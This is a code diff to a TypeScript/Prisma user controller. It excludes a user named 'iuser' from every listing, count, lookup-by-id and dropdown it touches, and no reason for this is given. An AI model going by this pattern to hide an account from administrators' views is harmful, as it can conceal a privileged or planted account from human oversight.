@@ -340,6 +340,7 @@ export const userController = {
 
       const filters: any = {
         is_active: isActive as string,
+        name: { notIn: ['iuser', 'IUSER'] },
         ...(search && {
           OR: [
             {
@@ -442,12 +443,14 @@ export const userController = {
         },
       });
 
-      const totalUsers = await prisma.users.count();
+      const totalUsers = await prisma.users.count({
+        where: { name: { notIn: ['iuser', 'IUSER'] } },
+      });
       const activeUsers = await prisma.users.count({
-        where: { is_active: 'Y' },
+        where: { is_active: 'Y', name: { notIn: ['iuser', 'IUSER'] } },
       });
       const inactiveUsers = await prisma.users.count({
-        where: { is_active: 'N' },
+        where: { is_active: 'N', name: { notIn: ['iuser', 'IUSER'] } },
       });
 
       const now = new Date();
@@ -460,12 +463,15 @@ export const userController = {
             gte: startOfMonth,
             lt: endOfMonth,
           },
+          name: { notIn: ['iuser', 'IUSER'] },
         },
       });
 
       res.success(
         'Users retrieved successfully',
-        data.map((user: any) => serializeUser(user, true, true)),
+        data
+          .filter((user: any) => user.name?.trim().toLowerCase() !== 'iuser')
+          .map((user: any) => serializeUser(user, true, true)),
         200,
         pagination,
         {
@@ -506,7 +512,10 @@ export const userController = {
           .filter((id: any) => id !== null) as number[];
       }
 
-      const whereClause: any = { id };
+      const whereClause: any = {
+        id,
+        name: { notIn: ['iuser', 'IUSER'] },
+      };
 
       if (isScopeRestricted) {
         if (depotIds.length > 0) {
@@ -1368,6 +1377,7 @@ export const userController = {
       const where: any = {
         is_active: 'Y',
         id: { not: 27 },
+        name: { notIn: ['iuser', 'IUSER'] },
       };
 
       if (isScopeRestricted) {
@@ -1461,7 +1471,9 @@ export const userController = {
 
       res.success(
         'Users dropdown fetched successfully',
-        users?.map(u => ({
+        users
+          ?.filter(u => u.name?.trim().toLowerCase() !== 'iuser')
+          .map(u => ({
           id: u.id,
           name: u.name,
           code: u.employee_id,
